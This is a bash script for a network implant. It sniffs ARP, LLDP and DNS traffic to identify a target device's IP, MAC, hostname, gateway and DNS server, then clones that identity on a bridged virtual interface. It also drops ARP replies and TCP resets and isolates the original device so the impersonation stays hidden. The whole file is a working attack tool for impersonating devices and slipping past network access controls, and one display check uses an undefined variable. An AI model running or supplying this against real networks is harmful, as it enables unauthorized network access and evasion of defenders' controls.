#!/bin/bash

# --- Configuration ---
VETH_IN="veth0"
VETH_OUT="veth1"
BRIDGE="br0"
LISTEN_IFACE="eth2"
LOG_DIR="/opt/implant/logs/spoof-target"
LOG_FILE="${LOG_DIR}/spoof-target.log"

# --- State Variables ---
SPOOFED_IP=""
SPOOFED_MAC=""
SPOOFED_HOSTNAME=""
GATEWAY_IP=""
DNS_SERVER=""
CAPTURE_FILE=""

# --- Option Flags ---
DO_IP_MAC=false
DO_HOSTNAME=false
DO_GATEWAY=false
DO_DNS=false
FORCE_CAPTURE=false
DEBUG=false
TIMEOUT=30 # Default capture timeout

# --- Functions ---

##
# Prints a debug message to stderr if DEBUG mode is enabled.
##
debug_log() {
  if $DEBUG; then
    echo "[DEBUG] $@" >&2
  fi
}

##
# Displays usage information and exits.
##
usage() {
  echo "Usage: $0 [detection options] [set options]"
  echo ""
  echo "Detection Options:"
  echo "  --ip-mac             Detect the most active IP and MAC address."
  echo "  --hostname           Detect the target's hostname (via LLDP, Windows targets only)."
  echo "  --gateway            Detect the network gateway."
  echo "  --dns                Detect the DNS server."
  echo "  --all                Enable all detection options."
  echo ""
  echo "Set Options (to provide known information):"
  echo "  --set-ip <ip>        Manually set the target IP address."
  echo "  --set-mac <mac>      Manually set the target MAC address."
  echo "  --set-hostname <val> Manually set the target hostname."
  echo ""
  echo "Control Options:"
  echo "  --timeout <sec>      Set the network capture duration (default: ${TIMEOUT}s)."
  echo "  --force              Capture in loops until all requested information is found."
  echo "  --debug              Enable verbose debugging output."
  echo "  --help               Display this help message."
  echo ""
  echo "Cleanup:"
  echo "  --clean              Remove all created interfaces and rules."
  exit 1
}

##
# Performs a network capture, saving relevant packets to a temporary file.
##
capture_traffic() {
  CAPTURE_FILE=$(sudo mktemp)
  # Ensure the capture file is removed on script exit
  trap 'sudo rm -f "$CAPTURE_FILE"' EXIT

  echo "[*] Starting network capture for ${TIMEOUT} seconds..."

  local capture_filter="arp or (ether proto 0x88cc) or (udp and (port 53 or port 67 or port 68 or port 137 or port 5353 or port 5355))"

  # If the trigger script exists and hostname detection has been requested, run it in the background to elicit a response
  if $DO_HOSTNAME && [ -z "$SPOOFED_HOSTNAME" ] && [ -x "/opt/implant/scripts/trigger-lldp.py" ]; then
    echo "[*] Launching LLDP trigger script in background..."
    sudo python3 /opt/implant/scripts/trigger-lldp.py &
  fi

  echo "[*] Capturing traffic... Press Ctrl+C to stop early."
  sudo tshark -q -i "${LISTEN_IFACE}" -f "${capture_filter}" -w "${CAPTURE_FILE}" -a duration:"${TIMEOUT}" 2>/dev/null

  local packets_captured
  packets_captured=$(sudo capinfos -c "$CAPTURE_FILE" | awk '{print $NF}')
  echo "[+] Capture finished. ${packets_captured} relevant packets saved."
  debug_log "Capture saved to ${CAPTURE_FILE}"
}

##
# Detects IP and MAC address from the capture file.
##
detect_ip_mac() {
  # Skip analysis if we already have the info
  if [ -n "$SPOOFED_IP" ] && [ -n "$SPOOFED_MAC" ]; then return; fi

  debug_log "Analyzing capture for IP/MAC..."
  local arp_replies
  arp_replies=$(sudo tshark -r "${CAPTURE_FILE}" -Y "arp.opcode == 2" -T fields -e eth.src -e arp.src.proto_ipv4 2>/dev/null)

  if [ -z "$arp_replies" ]; then
    debug_log "No ARP replies found in capture."
    return
  fi

  # Find the most frequent IP/MAC pair
  local best_pair
  best_pair=$(echo "$arp_replies" | sort | uniq -c | sort -nr | head -n 1 | awk '{print $2, $3}')
  
  SPOOFED_MAC=$(echo "$best_pair" | awk '{print $1}')
  SPOOFED_IP=$(echo "$best_pair" | awk '{print $2}')
  echo "[+] Target IP/MAC detected: ${SPOOFED_IP} (${SPOOFED_MAC})"
}

##
# Detects the hostname for the previously found MAC address.
##
detect_hostname() {
  if [ -n "$SPOOFED_HOSTNAME" ]; then return; fi
  if [ -z "$SPOOFED_MAC" ]; then
    debug_log "Cannot detect hostname without a target MAC. Skipping for now."
    return
  fi
  debug_log "Analyzing capture for hostname from MAC ${SPOOFED_MAC}..."

  # Attempt to find hostname via LLDP
  local lldp_hostname
  lldp_hostname=$(sudo tshark -r "${CAPTURE_FILE}" -Y "lldp and eth.src == ${SPOOFED_MAC}" -V 2>/dev/null | grep -E "System Name:|Chassis Subtype = Locally assigned, Id:" | head -n 1 | awk -F': ' '{print $2}')

  if [ -n "$lldp_hostname" ]; then
    SPOOFED_HOSTNAME=$(echo "$lldp_hostname" | cut -d'.' -f1)
    echo "[+] Target Hostname detected (from LLDP): ${SPOOFED_HOSTNAME}"
    return
  fi
}

##
# Detects the gateway using a multi-layered heuristic.
##
detect_gateway() {
  if [ -n "$GATEWAY_IP" ]; then return; fi

  debug_log "Analyzing capture for Gateway using multi-layered heuristic..."

  # --- Step 1: Find the most 'central' IP using the conversational heuristic ---
  local all_arp_ips
  all_arp_ips=$(sudo tshark -r "${CAPTURE_FILE}" -Y "arp" -T fields -e arp.src.proto_ipv4 -e arp.dst.proto_ipv4 2>/dev/null | tr '\t' '\n')

  if [ -z "$all_arp_ips" ]; then return; fi

  local top_candidate
  top_candidate=$(echo "$all_arp_ips" | grep -v "^${SPOOFED_IP}$" | sort | uniq -c | sort -nr | head -n 1 | awk '{print $2}')

  # --- Step 2: Check if the top candidate is a common gateway IP ---
  if [[ "$top_candidate" =~ \.1$ || "$top_candidate" =~ \.254$ ]]; then
    debug_log "Top candidate (${top_candidate}) is a common gateway. Selecting it."
    GATEWAY_IP=$top_candidate
  else
    # --- Step 3: If not, fall back to the 'most requested' heuristic ---
    debug_log "Top candidate is not a common gateway. Falling back to most-requested IP."
    local arp_targets
    arp_targets=$(sudo tshark -r "${CAPTURE_FILE}" -Y "arp.opcode == 1" -T fields -e arp.dst.proto_ipv4 2>/dev/null | grep -v "^${SPOOFED_IP}$")

    if [ -n "$arp_targets" ]; then
      GATEWAY_IP=$(echo "$arp_targets" | grep -v "^${SPOOFED_IP}$" | sort | uniq -c | sort -nr | head -n 1 | awk '{print $2}')
    fi
  fi

  if [ -n "$GATEWAY_IP" ]; then
    echo "[+] Gateway detected: ${GATEWAY_IP}"
  fi
}

##
# [UNUSED] Detects the gateway by analyzing ARP requests in the capture file.
##
detect_gateway2() {
  if [ -n "$GATEWAY_IP" ]; then return; fi

  debug_log "Analyzing capture for Gateway..."
  local tshark_output
  tshark_output=$(sudo tshark -r "${CAPTURE_FILE}" -Y "arp.opcode==1" -T fields -e eth.src -e arp.src.proto_ipv4 -e arp.dst.proto_ipv4 2>/dev/null)

  if [ -z "$tshark_output" ]; then return; fi

  declare -A mac_dst_map
  while read -r mac src_ip dst_ip; do
    mac_dst_map["$mac"]+="$dst_ip "
  done <<< "$tshark_output"

  local best_mac=""
  local max_unique_ips=0
  for mac in "${!mac_dst_map[@]}"; do
    local unique_count
    unique_count=$(echo "${mac_dst_map[$mac]}" | tr ' ' '\n' | sort -u | wc -l)
    if (( unique_count > max_unique_ips )); then
      max_unique_ips=$unique_count
      best_mac=$mac
    fi
  done

  if [ -n "$best_mac" ]; then
    GATEWAY_IP=$(echo "$tshark_output" | awk -v mac="$best_mac" '$1 == mac { print $2; exit }')
    echo "[+] Gateway detected: ${GATEWAY_IP}"
  fi
}

##
# Detects the DNS server by analyzing DNS queries in the capture file.
##
detect_dns() {
  if [ -n "$DNS_SERVER" ]; then return; fi

  debug_log "Analyzing capture for DNS Server..."
  local dns_queries

  dns_queries=$(sudo tshark -r "${CAPTURE_FILE}" -Y "udp.dstport == 53 and not ip.dst == 224.0.0.251 and not ip.dst == 224.0.0.252" -T fields -e ip.dst 2>/dev/null)

  if [ -n "$dns_queries" ]; then
    DNS_SERVER=$(echo "$dns_queries" | sort | uniq -c | sort -nr | head -n 1 | awk '{print $2}')
    echo "[+] DNS Server detected: ${DNS_SERVER}"
  fi
}

##
# Checks if all requested information has been found.
# Returns 0 if complete, 1 if not.
##
check_detection_status() {
    if $DO_IP_MAC && { [ -z "$SPOOFED_IP" ] || [ -z "$SPOOFED_MAC" ]; }; then return 1; fi
    if $DO_HOSTNAME && [ -z "$SPOOFED_HOSTNAME" ]; then return 1; fi
    if $DO_GATEWAY && [ -z "$GATEWAY_IP" ]; then return 1; fi
    if $DO_DNS && [ -z "$DNS_SERVER" ]; then return 1; fi
    # All conditions met
    return 0
}

##
# Logs the captured information to a file.
##
log_info() {
  local reason="$1"
  sudo mkdir -p "$LOG_DIR"
  {
  echo "--- Log Entry: $(date) ---"
  echo "Status: ${reason}"
  echo "  Spoofed IP:         ${SPOOFED_IP:-Not set}"
  echo "  Spoofed MAC:        ${SPOOFED_MAC:-Not set}"
  echo "  Spoofed Hostname:   ${SPOOFED_HOSTNAME:-Not set}"
  echo "  Detected Gateway:   ${GATEWAY_IP:-Not set}"
  echo "  Detected DNS:       ${DNS_SERVER:-Not set}"
  echo ""
  } | sudo tee -a "$LOG_FILE" > /dev/null
}

##
# Displays a summary and asks for user confirmation.
##
display_summary_and_confirm() {
  echo ""
  echo "--- Detection Summary ---"
  echo "  Spoofed IP:         ${SPOOFED_IP:-Not found}"
  echo "  Spoofed MAC:        ${SPOOFED_MAC:-Not found}"
  echo "  Spoofed Hostname:   ${SPOOFED_HOSTNAME:-Not set}"
  if $DETECT_NET_CONFIG; then
    echo "  Detected Gateway:   ${GATEWAY_IP:-Not found}"
    echo "  Detected DNS:       ${DNS_SERVER:-Not found}"
  fi
  echo "-------------------------"

  if [[ -z "$SPOOFED_IP" || -z "$SPOOFED_MAC" ]]; then
    echo "[!] Critical information (IP/MAC) could not be determined. Cannot proceed."; exit 1
  fi

  read -p "Apply these settings? (y/N): " confirm
  if [[ "$confirm" =~ ^[yY]$ ]]; then return 0; else echo "[*] User aborted."; return 1; fi
}

##
# Applies the spoofed configuration.
##
apply_spoof_config() {
  echo "[*] Applying spoofed configuration..."
  if ! ip link show "$VETH_IN" &>/dev/null; then
    sudo ip link add "$VETH_IN" type veth peer name "$VETH_OUT";
  fi

  sudo ip link set "$VETH_IN" up;
  sudo brctl addif "$BRIDGE" "$VETH_IN" 2>/dev/null
  sudo ip link set dev "$VETH_OUT" down;
  sudo ip link set dev "$VETH_OUT" address "$SPOOFED_MAC";
  sudo ip link set dev "$VETH_OUT" up
  sudo ip addr flush dev "$VETH_OUT";
  sudo ip addr add "${SPOOFED_IP}/24" dev "$VETH_OUT"

  # Prevent packets from implant from reaching the original target device
  echo "[*] Adding ebtables rule to isolate target..."
  sudo ebtables -A FORWARD -i "$VETH_IN" -o "$LISTEN_IFACE" -j DROP

  # Avoid leaking ARP replies from the implant's bridge that would conflict
  echo "[*] Adding arptables rule to prevent ARP conflicts..."
  sudo arptables -A OUTPUT -o "$BRIDGE" --opcode Reply -j DROP

  # Add iptables rule to prevent the implant from sending TCP Resets ---
  echo "[*] Adding iptables rule to block outgoing TCP RST packets..."
  sudo iptables -A OUTPUT -o veth1 -p tcp --tcp-flags RST RST -j DROP

  # Disable MAC learning on the bridge to ensure it forwards all traffic
  echo "[*] Disabling MAC address aging on bridge ${BRIDGE}..."
  sudo brctl setageing "$BRIDGE" 0

  if [ -n "$SPOOFED_HOSTNAME" ]; then
    sudo hostnamectl set-hostname "$SPOOFED_HOSTNAME"
    if ! grep -q "$SPOOFED_HOSTNAME" /etc/hosts; then
      sudo sed -i "/^127\.0\.1\.1\s\+/c\127.0.1.1\t$SPOOFED_HOSTNAME" /etc/hosts || echo -e "127.0.1.1\t$SPOOFED_HOSTNAME" | sudo tee -a /etc/hosts >/dev/null
    fi
  fi
}


##
# Cleans up created interfaces and rules.
##
cleanup() {
  echo "[*] Cleaning up spoofed network setup..."

  # Remove firewall rules
  echo "[*] Removing ebtables and arptables rules..."
  sudo ebtables -D FORWARD -i "$VETH_IN" -o "$LISTEN_IFACE" -j DROP 2>/dev/null
  sudo arptables -D OUTPUT -o "$BRIDGE" --opcode Reply -j DROP 2>/dev/null
  sudo iptables -D OUTPUT -o "${VETH_OUT}" -p tcp --tcp-flags RST RST -j DROP 2>/dev/null

  # Remove virtual interface pair
  if ip link show "$VETH_IN" &>/dev/null; then
    echo "[*] Deleting veth pair (${VETH_IN} <-> ${VETH_OUT})..."
    sudo ip link delete "$VETH_IN"
  fi

  echo "[+] Cleanup complete."
  exit 0
}

# --- Main Execution Logic ---

# Check for essential tools
for tool in tshark ip brctl ebtables arptables hostnamectl timeout awk capinfos; do
  if ! command -v "$tool" &> /dev/null; then echo "[!] Tool '${tool}' not found." >&2; exit 1; fi
done

# Parsing arguments
while [ "$#" -gt 0 ]; do
    case "$1" in
        --ip-mac) DO_IP_MAC=true; shift;;
        --hostname) DO_HOSTNAME=true; shift;;
        --gateway) DO_GATEWAY=true; shift;;
        --dns) DO_DNS=true; shift;;
        --all) DO_IP_MAC=true; DO_HOSTNAME=true; DO_GATEWAY=true; DO_DNS=true; shift;;
        
        --set-ip) SPOOFED_IP="$2"; shift 2;;
        --set-mac) SPOOFED_MAC="$2"; shift 2;;
        --set-hostname) SPOOFED_HOSTNAME="$2"; shift 2;;

        --timeout) TIMEOUT="$2"; shift 2;;
        --force) FORCE_CAPTURE=true; shift;;
        --clean) cleanup;;
        --help) usage;;
        --debug) DEBUG=true; shift;;
        *) echo "[!] Error: Unknown or unexpected argument '$1'." >&2; usage;;
    esac
done

# Check if at least one detection or set option was chosen for core info
if [ -z "$SPOOFED_IP" ] && [ -z "$SPOOFED_MAC" ] && ! $DO_IP_MAC; then
    echo "[!] Error: You must either detect (--ip-mac) or provide (--set-ip/--set-mac) the target's identity." >&2
    usage
fi

# --- Execution Flow ---
run_detection_cycle() {
    # Only capture if there is something left to detect
    if ( $DO_IP_MAC && ([ -z "$SPOOFED_IP" ] || [ -z "$SPOOFED_MAC" ]) ) || \
       ( $DO_HOSTNAME && [ -z "$SPOOFED_HOSTNAME" ] ) || \
       ( $DO_GATEWAY && [ -z "$GATEWAY_IP" ] ) || \
       ( $DO_DNS && [ -z "$DNS_SERVER" ] ); then
        capture_traffic
        if $DO_IP_MAC; then detect_ip_mac; fi
        if $DO_HOSTNAME; then detect_hostname; fi
        if $DO_GATEWAY; then detect_gateway; fi
        if $DO_DNS; then detect_dns; fi
    else
        debug_log "All requested information was provided manually. Skipping capture."
    fi
}

# Run the first detection cycle
run_detection_cycle

# If in --force mode, loop until all requested information is found
if $FORCE_CAPTURE; then
    while ! check_detection_status; do
        echo "[*] Some information is still missing. Retrying capture..."
        run_detection_cycle
    done
    echo "[+] All requested information has been found!"
fi

if display_summary_and_confirm; then
  apply_spoof_config
  log_info "Settings applied successfully."
else
  log_info "User aborted; settings not applied."
  exit 1
fi

exit 0